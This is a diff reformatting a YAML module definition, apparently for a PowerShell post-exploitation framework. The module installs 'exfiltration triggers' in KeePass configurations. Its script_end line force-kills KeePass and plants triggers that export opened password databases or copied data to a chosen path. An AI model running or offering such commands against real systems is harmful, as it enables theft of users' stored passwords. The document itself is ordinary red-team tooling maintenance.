@@ -1,10 +1,14 @@
 name: Add-KeePassConfigTrigger
 authors:
-  - '@tifkin_'
-  - '@harmj0y'
-description: This module adds a KeePass exfiltration trigger to all KeePass configs
-  found by Find-KeePassConfig.
+  - name: Lee Christensen
+    handle: '@tifkin_'
+    link: https://twitter.com/tifkin_
+  - name: Will Schroeder
+    handle: '@harmj0y'
+    link: https://twitter.com/harmj0y
+description: This module adds a KeePass exfiltration trigger to all KeePass configs found by Find-KeePassConfig.
 software: ''
+tactics: []
 techniques:
   - T1119
 background: true
@@ -21,8 +25,7 @@ options:
     required: true
     value: ''
   - name: Action
-    description: '''ExportDatabase'' (export opened databases to $ExportPath) or ''ExfilDataCopied''
-    (export copied data to $ExportPath).'
+    description: "'ExportDatabase' (export opened databases to $ExportPath) or 'ExfilDataCopied' (export copied data to $ExportPath)."
     required: true
     value: ExportDatabase
   - name: ExportPath
@@ -36,7 +39,7 @@ options:
   - name: OutputFunction
     description: PowerShell's output function to use ("Out-String", "ConvertTo-Json", "ConvertTo-Csv", "ConvertTo-Html", "ConvertTo-Xml").
     required: false
-    value: 'Out-String'
+    value: Out-String
     strict: false
     suggested_values:
       - Out-String
@@ -44,5 +47,6 @@ options:
       - ConvertTo-Csv
       - ConvertTo-Html
       - ConvertTo-Xml
-script_path: 'collection/vaults/KeePassConfig.ps1'
-script_end: Get-Process *keepass* | Stop-Process -Force; Find-KeePassconfig | Add-KeePassConfigTrigger {{ PARAMS }}; Find-KeePassconfig | Get-KeePassConfigTrigger | Format-List | {{ OUTPUT_FUNCTION }} | %{$_ + "`n"}; 'Add-KeePassConfigTrigger completed'
+script_path: collection/vaults/KeePassConfig.ps1
+script_end: Get-Process *keepass* | Stop-Process -Force; Find-KeePassconfig | Add-KeePassConfigTrigger {{ PARAMS }}; Find-KeePassconfig
+  | Get-KeePassConfigTrigger | Format-List | {{ OUTPUT_FUNCTION }} | %{$_ + "`n"}; 'Add-KeePassConfigTrigger completed'
